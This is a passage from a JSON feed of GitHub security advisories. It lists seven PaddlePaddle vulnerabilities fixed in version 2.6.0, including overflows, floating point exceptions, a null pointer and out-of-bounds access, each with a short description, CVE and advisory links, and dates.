            "content_html": "<p>Heap buffer overflow in paddle.repeat_interleave&nbsp;in PaddlePaddle before 2.6.0. This flaw can lead to a denial of service, information disclosure, or more damage is possible.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52309\">https://nvd.nist.gov/vuln/detail/CVE-2023-52309</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-018.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-018.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc\">https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8fp7-jwv2-49x9\">https://github.com/advisories/GHSA-8fp7-jwv2-49x9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8fp7-jwv2-49x9",
            "title": "[PaddlePaddle] PaddlePaddle heap buffer overflow in paddle.repeat_interleave",
            "date_modified": "2024-01-05T17:26:05.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8fp7-jwv2-49x9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>FPE in paddle.amin&nbsp;in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52308\">https://nvd.nist.gov/vuln/detail/CVE-2023-52308</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-017.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-017.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc\">https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v9pg-qw6x-w5r2\">https://github.com/advisories/GHSA-v9pg-qw6x-w5r2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v9pg-qw6x-w5r2",
            "title": "[PaddlePaddle] PaddlePaddle floating point exception in paddle.amin",
            "date_modified": "2024-01-03T21:56:30.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v9pg-qw6x-w5r2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Stack overflow in paddle.linalg.lu_unpack&nbsp;in PaddlePaddle before 2.6.0. This flaw can lead to a denial of service, or even more damage.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52307\">https://nvd.nist.gov/vuln/detail/CVE-2023-52307</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-016.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-016.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/6fdb316c8b0eb747e5324907e352824c9dba8215\">https://github.com/PaddlePaddle/Paddle/commit/6fdb316c8b0eb747e5324907e352824c9dba8215</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g57v-2687-jx33\">https://github.com/advisories/GHSA-g57v-2687-jx33</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g57v-2687-jx33",
            "title": "[PaddlePaddle] PaddlePaddle stack overflow in paddle.linalg.lu_unpack",
            "date_modified": "2024-01-05T17:25:46.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g57v-2687-jx33"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>FPE in paddle.lerp&nbsp;in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52306\">https://nvd.nist.gov/vuln/detail/CVE-2023-52306</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-015.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-015.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc\">https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rg9q-m8hv-xxr6\">https://github.com/advisories/GHSA-rg9q-m8hv-xxr6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rg9q-m8hv-xxr6",
            "title": "[PaddlePaddle] PaddlePaddle floating point exception in paddle.lerp",
            "date_modified": "2024-01-03T21:56:00.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rg9q-m8hv-xxr6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>FPE in paddle.topk&nbsp;in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52305\">https://nvd.nist.gov/vuln/detail/CVE-2023-52305</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-014.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-014.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc\">https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rx2r-q96c-w5cc\">https://github.com/advisories/GHSA-rx2r-q96c-w5cc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rx2r-q96c-w5cc",
            "title": "[PaddlePaddle] PaddlePaddle floating point exception in paddle.topk",
            "date_modified": "2024-01-03T21:55:35.000Z",
            "date_published": "2024-01-03T09:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rx2r-q96c-w5cc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Nullptr in paddle.put_along_axis&nbsp;in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52303\">https://nvd.nist.gov/vuln/detail/CVE-2023-52303</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-012.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-012.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc\">https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2wcj-qr76-9768\">https://github.com/advisories/GHSA-2wcj-qr76-9768</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2wcj-qr76-9768",
            "title": "[paddlepaddle] PaddlePaddle segfault in paddle.put_along_axis",
            "date_modified": "2024-01-03T21:55:18.000Z",
            "date_published": "2024-01-03T09:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2wcj-qr76-9768"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OOB access in paddle.mode&nbsp;in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-38678\">https://nvd.nist.gov/vuln/detail/CVE-2023-38678</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-010.md\">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2023-010.md</a></li>\n<li><a href=\"https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc\">https://github.com/PaddlePaddle/Paddle/commit/19da5c0c4d8c5e4dfef2a92e24141c3f51884dcc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mr78-v55p-7777\">https://github.com/advisories/GHSA-mr78-v55p-7777</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mr78-v55p-7777",
            "title": "[PaddlePaddle] PaddlePaddle segfault in paddle.mode",
            "date_modified": "2024-01-03T21:52:19.000Z",
            "date_published": "2024-01-03T09:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mr78-v55p-7777"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}